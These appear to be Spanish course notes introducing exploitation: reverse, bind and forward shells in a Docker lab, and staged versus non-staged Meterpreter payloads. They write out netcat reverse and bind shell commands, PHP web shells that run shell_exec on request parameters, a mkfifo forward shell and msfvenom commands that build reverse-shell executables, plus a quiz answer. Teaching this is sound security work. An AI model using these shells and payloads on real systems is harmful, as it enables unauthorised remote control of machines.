# Introducción a la explotación de vulnerabilidades

Una vez aplicada la fase de reconocimiento inicial, ya podríamos proceder con la fase de explotación, pero es importante comprender algunos conceptos antes de comenzar con la explotación de vulnerabilidades.

A lo largo de las siguientes clases, exploraremos diferentes tipos de shells (como las reverse shells, bind shells y forward shells), las cuales nos permitirán establecer conexiones de red y tomar control de un sistema comprometido. Hablaremos sobre los diferentes tipos de payloads (staged y non-staged) y cómo se utilizan para ejecutar código malicioso en el sistema objetivo.

Además, se discutirá la diferencia entre las explotaciones manuales y automatizadas, presentando herramientas que pueden ser utilizadas para automatizar el proceso de explotación de vulnerabilidades.

Por último, se introducirá la herramienta BurpSuite, una suite de herramientas para realizar pruebas de penetración y análisis de vulnerabilidades en aplicaciones web.


# Reverse Shells, Bind Shells y Forward Shells


- Reverse Shell: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.




### Ejemplo

```bash
nano Dockerfile
```


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```


docker build -t image_name .


docker run -dit -p 80:80 --name container_name image_name

docker exec -it container_name bash



### Atacante

nc -nlvp 443


### Cliente 

nc -e /bin/bash ip puertp

ncat -e /bin/bash 172.17.0.1 443


### Obtener una mejor shell 

script /dev/null -c bash


- Bind Shell: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.



### Cliente 

nc -nlvp 443 -e /bin/bash

### Atacante

nc ip puerto



- Forward shell

### Obtener una mejor shell 

script /dev/null -c bash



### Ejemplo

```bash
nano Dockerfile
```


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```


docker build -t image_name .


docker run -dit -p 80:80 --name container_name image_name

docker exec -it container_name bash



- Forward Shell: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de mkfifo, que crea un archivo FIFO (named pipe), que se utiliza como una especie de “consola simulada” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, lo que permite la comunicación bidireccional con la máquina remota.




### IPTABLES


```bash
FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt install -y apache2 \
    php
EXPOSE 80
ENTRYPOINT service apache2 start & /bin/bash
```

docker build -t image_name .


docker run -dit -p 80:80 --cap-add=NET_ADMIN --name container_name image_name

docker exec -it container_name bash



apt install iptables 

iptables --flush

**Acptar todas las conexiones al puerto 80**

//iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
//iptables -A OUTPUT -p tcp -m tcp --dport 0-65535 -m contrack --ctstate NEW -j DROP


iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT

iptables -A OUTPUT -o eth0 -j DROP






```bash
<?
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"
>
```

### TTYOverHTTP

En ocasiones cuando comprometemos un servidor web, hay reglas configuradas (Ej: iptables) que nos impiden obtener una Reverse Shell vía Netcat, Python, u otra utilidad.

Con esta herramienta, evitamos tener que hacer uso de una reverse shell para obtener una TTY posteriormente completamente interactiva. A través de archivos 'mkfifo', jugamos para simular una TTY interactiva sobre HTTP, logrando manejarnos sobre el sistema cómodamente sin ningún tipo de problema.

Lo único que necesitamos, es subir al servidor comprometido una estructura PHP como la siguiente para ejecutar comandos:

<?php
	echo shell_exec($_REQUEST['cmd']);
?>
Una vez subido, simplemente ejecutamos el script (Es necesario cambiar la ruta en el script donde se sitúa nuestro script PHP alojado en el servidor vulnerado).

Tras su ejecución, se muestra un ejemplo de su utilidad:



https://github.com/s4vitar/ttyoverhttp


**Cambiar el nombre del archivo**

index.php  --> cmd.php

	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()




mkfifo input; tail -f input | /bin/sh 2>&1 > output

echo "whoami" > input

cat output



# Tipos de payloads (Staged y Non-Staged)

En esta clase, veremos los dos tipos de payloads utilizados en ataques informáticos: Staged y Non-Staged.

- Payload Staged: Es un tipo de payload que se divide en dos o más etapas. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.




## msfvenom

**msfvenom es técnicamente parte del marco de Metasploit, sin embargo, se envía como una herramienta independiente. msfvenom se usa para generar cargas útiles en la marcha.**


**WINDOWS**

msfvenom -P Windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST = <Inding-ip> LPORT = <Inding-Port>


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=ip LPORT=443 -f exe -o reverse.exe
```

-F <Format>
Especifica el formato de salida. En este caso, eso es un ejecutable (exe)
-o <archivo>
La ubicación de salida y el nombre de archivo para la carga útil generada.
Lhost = <ip>
Especifica la IP para conectarse nuevamente. Al usar TryhackMe, esta será su dirección IP TUN0. Si no puede cargar el enlace, no está conectado a la VPN.
Lport = <port>



## Meterpreter

Type use exploit/multi/handler

// set PAYLOAD <payload>
set LHOST <ip_atacante>
set LPORT <pueto_atacante>



What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf  LHOST=10.10.10.5 LPORT=443






- Payload Non-Staged: Es un tipo de payload que se envía como una sola entidad y no se divide en múltiples etapas. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.



```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp  --platform windows -a x64 LHOST=ip LPORT=443 -f exe -o reverse.exe
```

## Meterpreter

Type use exploit/multi/handler

set PAYLOAD <payload>
set LHOST <ip_atacante>
set LPORT <pueto_atacante>
